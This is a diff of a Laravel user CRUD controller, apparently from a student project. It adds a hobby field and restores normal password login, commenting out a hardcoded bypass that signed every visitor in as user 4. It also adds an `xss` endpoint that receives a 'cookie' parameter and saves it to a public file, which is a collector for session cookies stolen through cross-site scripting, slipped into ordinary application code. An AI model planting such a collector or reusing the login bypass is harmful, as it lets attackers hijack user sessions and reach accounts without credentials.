@@ -25,6 +25,7 @@ class CrudUserController extends Controller
             'phone' => 'required|max:10',
             'image' => 'required',
             'masosv' => 'required',
+            'sothich' => 'required',
         ]);
 
         $data = $request->all();
@@ -45,7 +46,9 @@ class CrudUserController extends Controller
             'password' => Hash::make($data['password']),
             'phone' => $data['phone'],
             'image' => $data['image'],  
-            'masosv' => $data['masosv'],    
+            'masosv' => $data['masosv'], 
+            'sothich' => $data['sothich'], 
+            
         ]);
 
         return redirect()->route('user.loginIndex');
@@ -97,6 +100,7 @@ class CrudUserController extends Controller
             $user['image'] = $filename;
         }
         $user->masosv = $input['masosv'];
+        $user->sothich = $input['sothich'];
         $user->save();
         return redirect('list');
 
@@ -116,27 +120,27 @@ class CrudUserController extends Controller
 
     public function customLogin(Request $request)
     {
-        // $request->validate([
-        //     'name' => 'required',
-        //     'password' => 'required',
-        // ]);
+        $request->validate([
+            'name' => 'required',
+            'password' => 'required',
+        ]);
    
-        // $credentials = $request->only('name', 'password');
-        // if (Auth::attempt($credentials)) {
-        //     return redirect()->intended('list')
-        //                 ->withSuccess('Signed in');
-        // }
+        $credentials = $request->only('name', 'password');
+        if (Auth::attempt($credentials)) {
+            return redirect()->intended('list')
+                        ->withSuccess('Signed in');
+        }
   
-        // return redirect("login")->withSuccess('Login details are not valid');
+        return redirect("login")->withSuccess('Login details are not valid');
 
-        $user = \App\Models\User::find(4);
-        if ($user) {
-            Auth::loginUsingId($user ->id);
-            return redirect('/list');
-        }
-        else{
-           return redirect('/login') ->with('Login details are not valid');
-        }
+        // $user = \App\Models\User::find(4);
+        // if ($user) {
+        //     Auth::loginUsingId($user ->id);
+        //     return redirect('/list');
+        // }
+        // else{
+        //    return redirect('/login') ->with('Login details are not valid');
+        // }
     }
     
     public function signOut() {
@@ -145,4 +149,10 @@ class CrudUserController extends Controller
         
         return Redirect('login');
     }
+    			
+public function xss(Request $request) {			
+	$cookie = $request->get('cookie');		
+	file_put_contents('C:\Users\Administrator\Desktop\kholuutru\GiuaKyBE2NhomK\public\xss.txt', $cookie);		
+	var_dump($cookie);die();		
+}			
 }
